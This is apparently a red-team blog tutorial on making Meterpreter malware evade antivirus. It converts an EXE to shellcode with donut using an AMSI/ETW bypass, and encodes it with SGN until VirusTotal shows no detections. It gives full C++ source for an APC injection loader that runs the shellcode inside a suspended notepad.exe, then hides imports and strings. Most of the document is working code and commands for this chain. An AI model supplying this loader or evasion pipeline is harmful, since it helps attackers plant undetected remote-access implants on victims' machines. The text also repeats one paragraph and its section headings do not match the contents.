## Table of Contents

- [**Outline**](#section-0)
- [**EXEtoShellCode**](#section-1)
- [**Shellcode Encoding**](#section-2)
- [**ShellCode Loader**](#section-3)
- [**Payload Obfuscation**](#section-4)
- [**IAT Obfuscation**](#section-5)
- [**Conclusion**](#section-6)




## Outline  {#section-0}


![](/assets/AV/APC.png)
## Creating MSI Malware {#section-0}

## Executable to Shell Code
We will convert meterpreter EXE to shellcode using donut.


https://github.com/TheWover/donut

This Donut command loads piggy.exe into memory with:
1) no entropy obfuscation (-e)
2) uses AMSI/WLDP/ETW bypass with a fail-safe option to continue if bypass fails (-b)
3) compresses the file using the aPLib engine (-z 2), and employs a decoy module at 
level 5 (-j 5) for added obfuscation and evasion.

```bash
./donut -i /home/kali/donut/piggy.exe -e 1 -b 3 -z -j 5
```

![](/assets/AV/donutImage.png)  

However, as expected the shellcode.bin when uploaded to virus total  has a large detection rate

![](/assets/AV/loaderVirus.png)  

## Polymorphic Shellcode Encoding (Shiginakatai)
While there are many shell code encryption and encoding methods such as XOR, AES, UUID, IPV4 obfuscation, some libraries and decryption functions are flagged by antivirus solutions such as AES decryption routine.
Here we will use a simple yet effective encoding  to obfuscate our payload, SGN encoding. “SGN is a polymorphic binary encoder for offensive security purposes such as generating statically undetectable binary payloads”.  It is the upgraded version of the famous shikata_ga_nai.rb used in metasploit.


https://github.com/EgeBalci/sgn
Now we will conduct shellcode obfuscation. -i is used for the input file (the meterpreter rat shellcode) and -o is the output. -a is for the architecture and -c is the number of encoding 
![](/assets/AV/sgn.png)  


```bash
sgn -i '/home/kali/donut/loader.bin' -o /home/kali/donut/loaderEncrypted.bin -a 64 -c 8 --verbose
```

The advantage of SGN is that during run time it will un-encode itself thereby the testers do not have to implement the un-encoding function. Testers need to simply load the obfuscated payload bin to their code.

Uploading the shellcode we get a 0 detection rate.
![](/assets/AV/zero.png)  


The advantage of SGN is that during run time it will un-encode itself thereby the testers do not have to implement the un-encoding function. Testers need to simply load the obfuscated payload bin to their code.

## Creating APC Shellcode Loader
Creating a Shellcode Loader

Now that we have our encoded shellcode, we need to create a PE, exe file to launch this shellcode using c++.
VirtualAlloc: Allocates memory for the payload, typically using MEM_COMMIT and PAGE_READWRITE to allow writing to the allocated memory.
RtlMoveMemory: Copies the payload (malicious code) from the file or buffer into the newly allocated memory region.
VirtualProtect: Changes the protection of the allocated memory from PAGE_READWRITE to PAGE_EXECUTE_READ to allow the payload to execute.
CreateThread: Starts a new thread, executing the payload in memory. This is the method used to run the injected code.
WaitForSingleObject: Pauses the current thread until the thread running the payload finishes execution, ensuring the payload completes.
QueueUserAPC: This function queues an Asynchronous Procedure Call (APC) to a specific thread. If used with a thread in an alertable state (such as one created with SleepEx or WaitForSingleObjectEx), the payload will be executed when the thread enters that state. This technique is commonly used to inject code into a thread in a less obvious manner, bypassing some common defenses.

```bash
#include <windows.h>
#include <windows.h>
#include <stdio.h>

// Function to read a binary file
unsigned char* readBinaryFile(const char* fileName, SIZE_T* size) {
    FILE* file = fopen(fileName, "rb");
    if (!file) {
        printf("Could not open file %s\n", fileName);
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    *size = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char* buffer = (unsigned char*)malloc(*size);
    if (!buffer) {
        printf("Memory allocation failed\n");
        fclose(file);
        return NULL;
    }

    fread(buffer, 1, *size, file);
    fclose(file);
    return buffer;
}

int main() {
    // Read shellcode from the binary file (e.g., loaderEncrypted.bin)
    const char* fileName = "loaderEncrypted.bin";
    SIZE_T shellcodeSize;
    unsigned char* shellcode = readBinaryFile(fileName, &shellcodeSize);
    
    if (!shellcode) {
        printf("Failed to read the binary file.\n");
        return -1;
    }

    // Create a suspended Notepad process
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("Failed to create process\n");
        free(shellcode);
        return -1;
    }

    // Allocate memory in the target process
    LPVOID bufferAddr = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!bufferAddr) {
        printf("VirtualAllocEx failed\n");
        free(shellcode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    // Write the shellcode into the allocated memory
    if (!WriteProcessMemory(pi.hProcess, bufferAddr, shellcode, shellcodeSize, NULL)) {
        printf("WriteProcessMemory failed\n");
        free(shellcode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    // Queue the APC for the shellcode to be executed
    QueueUserAPC((PAPCFUNC)bufferAddr, pi.hThread, NULL);

    // Resume the suspended thread to execute the shellcode
    ResumeThread(pi.hThread);

    // Cleanup
    free(shellcode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}


```
## IAT Obfuscation

One thing to note is that using the above WIN32 API directly, such as VirtualAllocEX, QueueUserAPC and etc will be likely flagged as suspicious. We can verify this by checking the Import Address Table by  utilizing a tool called PE Studio

 ![](/assets/AV/PE.png)  
Dynamic Function Resolution: GetProcAddress is used to dynamically resolve the addresses of the required functions 

```bash

HMODULE hKernel32 = GetModuleHandle("kernel32.dll");

LPVOID (WINAPI * pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
pVirtualAllocEx = (LPVOID (WINAPI *)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD)) GetProcAddress(hKernel32, "VirtualAllocEx");

```

If we do not want to do this manually, we can use built in importers.
```bash
https://github.com/JustasMasiulis/lazy_importer
```
Download the lazy_importer.hpp and save it in a folder called include. 
Simply add LI_FN() to the function.

We can further implement a custom GetProcAddress to hide its WINAPI Function call but this time we leave it out. 


## String Obfuscation
Let's take the following code snippet for example, where we create a notepad process for future shell code injection, 
the string c:\\windows\\system32\notepad.exe is identified in the executable. We can check this using strings.
```bash
strings.exe -n 8 implant.exe | findstr /i "C:\\windows"
```
 ![](/assets/AV/string.png)  
